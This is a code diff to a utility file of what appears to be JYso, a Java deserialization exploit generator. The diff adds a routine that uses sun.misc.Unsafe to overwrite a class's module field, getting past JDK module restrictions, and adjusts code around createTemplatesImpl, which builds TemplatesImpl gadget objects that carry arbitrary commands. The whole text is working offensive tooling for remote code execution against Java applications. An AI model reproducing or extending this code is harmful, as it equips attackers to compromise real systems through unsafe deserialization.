@@ -1,16 +1,15 @@
 package com.qi4l.JYso.gadgets.utils;
 
+import com.qi4l.JYso.gadgets.CommonsCollectionsK2;
 import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
 import javassist.ClassClassPath;
 import javassist.CtClass;
 import javassist.CtConstructor;
+import sun.misc.Unsafe;
 
-import java.lang.reflect.Array;
-import java.lang.reflect.Constructor;
-import java.lang.reflect.InvocationHandler;
-import java.lang.reflect.Proxy;
+import java.lang.reflect.*;
 import java.util.Base64;
 import java.util.HashMap;
 import java.util.Hashtable;
@@ -75,6 +74,17 @@ public class Gadgets extends ClassLoader {
         return map;
     }
 
+    private static void patchModule(Class clazz, Class goalclass) {
+        try {
+            Class UnsafeClass = Class.forName("sun.misc.Unsafe");
+            Field unsafeField = UnsafeClass.getDeclaredField("theUnsafe");
+            unsafeField.setAccessible(true);
+            Unsafe unsafe       = (Unsafe) unsafeField.get(null);
+            Object ObjectModule = Class.class.getMethod("getModule").invoke(goalclass);
+            unsafe.getAndSetObject(clazz, unsafe.objectFieldOffset(Class.class.getDeclaredField("module")), ObjectModule);
+        } catch (Exception e) {
+        }
+    }
 
     public static Object createTemplatesImpl(String command) throws Exception {
         command = command.trim();
@@ -87,6 +97,7 @@ public class Gadgets extends ClassLoader {
         CtClass ctClass      = null;
         byte[]  classBytes   = new byte[0];
         String  newClassName = generateClassName();
+
 
         final Object templates = TPL_CLASS.newInstance();
         POOL.insertClassPath(new ClassClassPath(ABST_TRANSLET));
@@ -163,10 +174,8 @@ public class Gadgets extends ClassLoader {
         }
 
         CtClass ctClass      = null;
-        byte[]  classBytes   = new byte[0];
         String  newClassName = generateClassName();
 
-        final Object templates = TPL_CLASS.newInstance();
         POOL.insertClassPath(new ClassClassPath(ABST_TRANSLET));
         CtClass superClass = POOL.get(ABST_TRANSLET.getName());
 
@@ -231,10 +240,8 @@ public class Gadgets extends ClassLoader {
         }
 
         CtClass ctClass      = null;
-        byte[]  classBytes   = new byte[0];
         String  newClassName = generateClassName();
 
-        final Object templates = TPL_CLASS.newInstance();
         POOL.insertClassPath(new ClassClassPath(ABST_TRANSLET));
         CtClass superClass = POOL.get(ABST_TRANSLET.getName());
 
